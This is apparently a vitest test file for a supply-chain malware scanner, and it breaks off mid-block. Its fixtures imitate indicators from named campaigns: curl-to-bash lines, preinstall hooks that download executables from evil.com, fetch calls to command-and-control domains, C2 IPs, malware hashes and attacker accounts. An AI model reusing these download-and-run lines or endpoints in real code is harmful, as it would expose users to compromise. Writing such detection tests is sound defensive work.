import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import { scan } from "../scanner.js";
import { MALICIOUS_PACKAGE_PATTERNS, PYPI_TYPOSQUAT_PATTERNS } from "../patterns.js";
import { matchPackageIOC, getBundledFeed } from "../threat-intel.js";
import { matchBareNpmIOC } from "../install-guard.js";

describe("Campaign Signatures", () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join("/tmp", "scg-campaign-"));
  });

  afterEach(() => {
    fs.rmSync(tempDir, { recursive: true, force: true });
  });

  // =================================================================
  // XZ Utils Backdoor (CVE-2024-3094)
  // =================================================================

  describe("XZ Utils Backdoor (CVE-2024-3094)", () => {
    it("should detect _get_cpuid function reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "payload.c"),
        ""
      );
      // .c is not in SCANNABLE_EXTENSIONS, use .js
      fs.writeFileSync(
        path.join(tempDir, "hook.js"),
        'const fn = "_get_cpuid"; callHook(fn);'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "XZ_GET_CPUID");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect lzma_crc64 function reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "lzma.js"),
        "function lzma_crc64(buf) { return crc(buf); }"
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "XZ_LZMA_CRC64");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("high");
    });

    it("should detect build system injection in configure.ac patterns", async () => {
      fs.writeFileSync(
        path.join(tempDir, "build.sh"),
        'gl_cv_host_cpu_c_abi="x86_64" =configure.ac'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "XZ_BUILD_INJECT");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("high");
    });

    it("should detect obfuscated test file extraction patterns", async () => {
      fs.writeFileSync(
        path.join(tempDir, "extract.sh"),
        'xz -d tests/files/payload.xz | head -c 1024'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "XZ_OBFUSCATED_TEST"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("high");
    });

    it("should generate XZ Utils recommendation", async () => {
      fs.writeFileSync(
        path.join(tempDir, "xz.js"),
        'const sym = "_get_cpuid";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.recommendations.some((r) => r.includes("CVE-2024-3094"))
      ).toBe(true);
    });
  });

  // =================================================================
  // Codecov Bash Uploader
  // =================================================================

  describe("Codecov Bash Uploader", () => {
    it("should detect curl piped to bash from codecov.io", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ci.sh"),
        "curl -s https://codecov.io/bash | bash"
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "CODECOV_CURL_BASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("high");
    });

    it("should detect codecov with credential exfiltration pattern", async () => {
      fs.writeFileSync(
        path.join(tempDir, "upload.sh"),
        'codecov upload --token $ENV_SECRET_CREDENTIAL'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "CODECOV_EXFIL"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("high");
    });

    it("should generate Codecov recommendation", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ci.sh"),
        "curl -s https://codecov.io/bash | bash"
      );

      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.recommendations.some((r) => r.includes("Codecov"))
      ).toBe(true);
    });
  });

  // =================================================================
  // SolarWinds SUNBURST
  // =================================================================

  describe("SolarWinds SUNBURST", () => {
    it("should detect avsvmcloud.com DGA domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "c2.js"),
        'const c2 = "update.avsvmcloud.com";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "SUNBURST_DGA");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect OrionImprovementBusinessLayer reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "backdoor.js"),
        "class OrionImprovementBusinessLayer { execute() {} }"
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "SUNBURST_ORION_CLASS"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect Thread.Sleep with long delay (>1hr)", async () => {
      fs.writeFileSync(
        path.join(tempDir, "evasion.js"),
        "Thread.Sleep(86400000);"
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "SUNBURST_DELAYED_EXEC"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("high");
    });

    it("should detect setTimeout with computed long delay", async () => {
      fs.writeFileSync(
        path.join(tempDir, "evasion2.js"),
        "setTimeout(callback, 24 * 86400);"
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "SUNBURST_DELAYED_EXEC"
      );
      expect(finding).toBeDefined();
    });

    it("should detect sleep with hour-based multiplier", async () => {
      fs.writeFileSync(
        path.join(tempDir, "evasion3.py"),
        "sleep(2 * 60 * 60)"
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "SUNBURST_DELAYED_EXEC"
      );
      expect(finding).toBeDefined();
    });

    it("should generate SUNBURST recommendation", async () => {
      fs.writeFileSync(
        path.join(tempDir, "sun.js"),
        'fetch("https://api.avsvmcloud.com/update");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.recommendations.some((r) => r.includes("SUNBURST"))
      ).toBe(true);
    });
  });

  // =================================================================
  // ua-parser-js hijack
  // =================================================================

  describe("ua-parser-js hijack", () => {
    it("should detect crypto miner download pattern (jsextension)", async () => {
      fs.writeFileSync(
        path.join(tempDir, "miner.sh"),
        "curl https://evil.com/jsextension.exe -o /tmp/miner"
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "UAPARSER_MINER"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect preinstall downloading executables", async () => {
      const pkg = {
        name: "ua-parser-evil",
        version: "1.0.0",
        scripts: {
          preinstall: 'curl https://evil.com/payload.exe -o /tmp/run'
        },
      };
      // Write as .json for content scanning
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify(pkg, null, 2)
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "UAPARSER_PREINSTALL_DL"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should generate ua-parser-js recommendation", async () => {
      fs.writeFileSync(
        path.join(tempDir, "miner.sh"),
        "wget https://evil.com/jsextension -o /tmp/miner"
      );

      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.recommendations.some((r) => r.includes("ua-parser-js"))
      ).toBe(true);
    });
  });

  // =================================================================
  // coa/rc npm hijack
  // =================================================================

  describe("coa/rc npm hijack", () => {
    it("should detect sdd.dll reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "payload.js"),
        'const dll = path.join(tmpdir, "sdd.dll");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "COA_RC_SDD_DLL"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect postinstall with encoded payload execution", async () => {
      const pkg = {
        name: "coa-evil",
        version: "1.0.0",
        scripts: {
          postinstall: 'node compile.js'
        },
      };
      // The pattern looks for postinstall with compile.js in file content
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify(pkg, null, 2)
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "COA_RC_POSTINSTALL"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should generate coa/rc recommendation", async () => {
      fs.writeFileSync(
        path.join(tempDir, "trojan.js"),
        'fs.writeFileSync("sdd.dll", payload);'
      );

      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.recommendations.some((r) => r.includes("coa/rc"))
      ).toBe(true);
    });
  });

  // =================================================================
  // Checkmarx KICS / Bitwarden CLI supply-chain breach (April 2026)
  // =================================================================

  describe("Checkmarx KICS / Bitwarden CLI Breach (April 2026)", () => {
    it("should detect the Shai-Hulud Third Coming marker", async () => {
      fs.writeFileSync(
        path.join(tempDir, "exfil.js"),
        'const tag = "Shai-Hulud: The Third Coming";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "CHECKMARX_SHAI_HULUD_V3"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the mcpAddon.js loader filename", async () => {
      fs.writeFileSync(
        path.join(tempDir, "loader.js"),
        'const dropper = require("./mcpAddon.js");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "CHECKMARX_MCP_ADDON"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the bw_setup.js / bw1.js loader pair", async () => {
      fs.writeFileSync(
        path.join(tempDir, "preinstall.js"),
        'require("bw_setup.js"); require("bw1.js");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "BITWARDEN_CLI_LOADER"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the audit.checkmarx.cx C2 domain via threat intel", async () => {
      fs.writeFileSync(
        path.join(tempDir, "beacon.js"),
        'fetch("https://audit.checkmarx.cx/v1/telemetry");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) =>
          f.description?.includes("audit.checkmarx.cx") ||
          f.description?.toLowerCase().includes("checkmarx")
      );
      expect(finding).toBeDefined();
    });
  });

  // =================================================================
  // DPRK @validate-sdk/v2 AI-inserted npm malware (April 2026)
  // =================================================================

  describe("DPRK @validate-sdk/v2 (April 2026)", () => {
    it("should detect references to @validate-sdk/v2 in code", async () => {
      fs.writeFileSync(
        path.join(tempDir, "deps.js"),
        'require("@validate-sdk/v2");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "DPRK_VALIDATE_SDK"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should flag @validate-sdk/v2 listed in a package.json", async () => {
      const pkg = {
        name: "victim-app",
        version: "1.0.0",
        dependencies: {
          "@validate-sdk/v2": "^1.0.0",
        },
      };
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify(pkg, null, 2)
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "DPRK_VALIDATE_SDK"
      );
      expect(finding).toBeDefined();
    });
  });

  // =================================================================
  // LofyGang / LofyStealer (April 2026)
  // =================================================================

  describe("LofyGang / LofyStealer (April 2026)", () => {
    it("should detect the LofyStealer marker", async () => {
      fs.writeFileSync(
        path.join(tempDir, "stealer.js"),
        'const family = "LofyStealer"; load(family);'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "LOFYSTEALER_MARKER"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the GrabBot alias", async () => {
      fs.writeFileSync(
        path.join(tempDir, "alias.js"),
        'const tag = "GrabBot v1";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "LOFYSTEALER_MARKER"
      );
      expect(finding).toBeDefined();
    });

    it("should detect Minecraft hack lure combined with credential theft", async () => {
      fs.writeFileSync(
        path.join(tempDir, "lure.js"),
        'const tool = "minecraft hack loader that will steal session token";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "LOFYGANG_MINECRAFT_LURE"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("high");
    });
  });

  // =================================================================
  // Mini Shai-Hulud / TeamPCP (April 2026)
  // =================================================================

  describe("Mini Shai-Hulud / TeamPCP (April 2026)", () => {
    it("should detect the dead-drop repository description marker", async () => {
      fs.writeFileSync(
        path.join(tempDir, "exfil.js"),
        'const desc = "A Mini Shai-Hulud has Appeared"; createRepo(desc);'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "MINI_SHAI_HULUD_MARKER"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the setup.mjs / execution.js loader filenames", async () => {
      fs.writeFileSync(
        path.join(tempDir, "loader.js"),
        'spawn("node", ["setup.mjs"]);'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "MINI_SHAI_HULUD_LOADER"
      );
      expect(finding).toBeDefined();
    });

    it("should detect a bun preinstall hook invoking setup.mjs", async () => {
      const pkg = {
        name: "victim-cap-pkg",
        version: "1.0.0",
        scripts: {
          preinstall: "bun setup.mjs",
        },
      };
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify(pkg, null, 2)
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "MINI_SHAI_HULUD_PREINSTALL"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Integration: multiple campaign indicators in same project
  // =================================================================

  describe("Multi-campaign detection", () => {
    it("should detect multiple campaigns in the same directory", async () => {
      fs.writeFileSync(
        path.join(tempDir, "sunburst.js"),
        'const c2 = "avsvmcloud.com";\nclass OrionImprovementBusinessLayer {}'
      );
      fs.writeFileSync(
        path.join(tempDir, "xz.js"),
        'hook("_get_cpuid");'
      );
      fs.writeFileSync(
        path.join(tempDir, "coa.js"),
        'download("sdd.dll");'
      );

      const report = await scan({ target: tempDir, format: "text" });

      const rules = new Set(report.findings.map((f) => f.rule));
      expect(rules.has("SUNBURST_DGA")).toBe(true);
      expect(rules.has("SUNBURST_ORION_CLASS")).toBe(true);
      expect(rules.has("XZ_GET_CPUID")).toBe(true);
      expect(rules.has("COA_RC_SDD_DLL")).toBe(true);
      expect(report.riskLevel).toBe("critical");
    });
  });

  // =================================================================
  // CanisterSprawl npm Worm / TeamPCP Update 008 (April 2026)
  // =================================================================

  describe("CanisterSprawl npm Worm (TeamPCP Update 008)", () => {
    it("should detect CanisterSprawl ICP canister C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "payload.js"),
        'const c2 = "https://whereisitat.lucyatemysuperbox.space/beacon";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // BufferZoneCorp Sleeper Packages (Ruby gems + Go modules, May 2026)
  // =================================================================

  describe("BufferZoneCorp Sleeper Packages", () => {
    it("should flag BufferZoneCorp GitHub account reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "deps.go"),
        'package main\nimport _ "github.com/BufferZoneCorp/go-retryablehttp"'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // MacSync Stealer / Homebrew Malvertising (May 2026)
  // =================================================================

  describe("MacSync Stealer (Homebrew Malvertising)", () => {
    it("should detect glowmedaesthetics.com C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "loader.js"),
        'fetch("http://glowmedaesthetics.com/curl/payload");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect MacSync stealer SHA256 hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "manifest.js"),
        'const knownHash = "a4fcfecc5ac8fa57614b23928a0e9b7aa4f4a3b2b3a8c1772487b46277125571";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // EtherRAT GitHub Facades (April 2026)
  // =================================================================

  describe("EtherRAT GitHub Facades", () => {
    it("should detect EtherRAT fallback C2 IP", async () => {
      fs.writeFileSync(
        path.join(tempDir, "config.js"),
        'const fallback = "135.125.255.55";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_IP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // DAEMON Tools QUIC RAT Supply Chain (May 2026)
  // =================================================================

  describe("DAEMON Tools QUIC RAT Supply Chain", () => {
    it("should detect env-check.daemontools.cc C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "stage1.js"),
        'const beacon = "https://env-check.daemontools.cc/probe";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // ZiChatBot PyPI Campaign (May 2026)
  // =================================================================

  describe("ZiChatBot PyPI Campaign", () => {
    it("should detect uuid32-utils package reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "deps.py"),
        'pkg = "uuid32-utils"; install(pkg)'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "ZICHATBOT_PACKAGE"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect colorinal package reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "setup.py"),
        'install_requires = ["colorinal>=1.0"]'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "ZICHATBOT_PACKAGE"
      );
      expect(finding).toBeDefined();
    });

    it("should detect termncolor package reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "deps.py"),
        'requirements = "termncolor==1.0.0"'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "ZICHATBOT_PACKAGE"
      );
      expect(finding).toBeDefined();
    });
  });

  // =================================================================
  // Beagle Backdoor / Fake Claude AI Site (May 2026)
  // =================================================================

  describe("Beagle Backdoor / Fake Claude AI Site", () => {
    it("should detect claude-pro.com C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "loader.js"),
        'const dl = "https://claude-pro.com/Claude-Pro-windows-x64.zip";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect license.claude-pro.com C2 subdomain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "beacon.js"),
        'const c2 = "license.claude-pro.com";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect 8.217.190.58 C2 IP", async () => {
      fs.writeFileSync(
        path.join(tempDir, "config.js"),
        'const host = "8.217.190.58";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_IP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // TCLBANKER Brazilian Banking Trojan (May 2026)
  // =================================================================

  describe("TCLBANKER Logitech Trojanizer (REF3076)", () => {
    it("should detect mxtestacionamentos.com WebSocket C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ws.js"),
        'const c2 = "wss://mxtestacionamentos.com/sock";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect campagna1-api workers.dev C2", async () => {
      fs.writeFileSync(
        path.join(tempDir, "beacon.js"),
        'fetch("https://campagna1-api.ef971a42.workers.dev/cmd");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect 191.96.224.96 historical C2 IP", async () => {
      fs.writeFileSync(
        path.join(tempDir, "host.js"),
        'const ip = "191.96.224.96";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_IP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect TCLBANKER SHA256 component hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashlist.js"),
        'const h = "701d51b7be8b034c860bf97847bd59a87dca8481c4625328813746964995b626";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // JDownloader Site Compromise / Python RAT (May 2026)
  // =================================================================

  describe("JDownloader Site Compromise (May 2026)", () => {
    it("should detect parkspringshotel.com staging domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "stage.js"),
        'const u = "https://parkspringshotel.com/m/Lu6aeloo.php";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect auraguest.lk staging domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "fetch.js"),
        'fetch("https://auraguest.lk/m/douV2quu.php");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect checkinnhotels.com C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "c2.js"),
        'const c2 = "checkinnhotels.com";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Fake OpenAI Privacy Filter / sefirah on Hugging Face (May 2026)
  // =================================================================

  describe("Fake OpenAI Privacy Filter (May 2026)", () => {
    it("should detect recargapopular.com sefirah C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "loader.js"),
        'const c2 = "https://recargapopular.com/upload";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Checkmarx Jenkins AST Plugin Compromise (May 2026) - TeamPCP / Mr_Rot13
  // =================================================================

  describe("Checkmarx Jenkins AST Plugin Compromise (May 2026)", () => {
    it("should detect Mr_Rot13 GitHub account reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "actor.js"),
        'const repo = "https://github.com/Mr_Rot13/some-tool";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect TeamPCP GitHub account reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "actor2.js"),
        'const url = "github.com/TeamPCP/payload";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // MacSync Stealer Claude.ai/Google ads variant (May 2026)
  // =================================================================

  describe("MacSync Stealer Claude.ai Variant (May 2026)", () => {
    it("should detect customroofingcontractors.com staging domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "stage.js"),
        'const u = "https://customroofingcontractors.com/loader.sh";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect bernasibutuwqu2.com C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "fetch.js"),
        'fetch("https://bernasibutuwqu2.com/p");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect briskinternet.com C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "c2.js"),
        'const c2 = "briskinternet.com";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect MacSync Claude variant payload SHA256", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashlist.js"),
        'const h = "ed5ed79a674972d1506dd8d68e8e13658125267ade86bfcb1ab794e2b49e50ac";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Mini Shai-Hulud Worm / TeamPCP - TanStack/UiPath/Mistral compromise (May 2026)
  // =================================================================

  describe("Mini Shai-Hulud Worm TanStack (May 2026)", () => {
    it("should detect filev2.getsession.org C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "c2.js"),
        'fetch("https://filev2.getsession.org/upload");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect api.masscan.cloud C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "c2.js"),
        'const u = "https://api.masscan.cloud/v1";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect git-tanstack.com phishing domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "c2.js"),
        'const u = "https://git-tanstack.com/payload";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect 83.142.209.194 C2 IP", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ip.js"),
        'const ip = "83.142.209.194";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_IP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // node-ipc credential stealer via maintainer email hijack (May 2026)
  // =================================================================

  describe("node-ipc Email Hijack Credential Stealer (May 2026)", () => {
    it("should detect sh.azurestaticprovider.net DNS exfiltration domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "exfil.js"),
        'const host = "sh.azurestaticprovider.net";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect 37.16.75.69 DNS exfiltration IP", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ip.js"),
        'const dns = "37.16.75.69";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_IP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect node-ipc.cjs credential stealer SHA256", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashlist.js"),
        'const h = "96097e0612d9575cb133021017fb1a5c68a03b60f9f3d24ebdc0e628d9034144";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Phantom Bot DDoS + leaked Shai-Hulud npm infostealer (May 2026)
  // =================================================================

  describe("Phantom Bot npm DDoS / deadcode09284814 (May 2026)", () => {
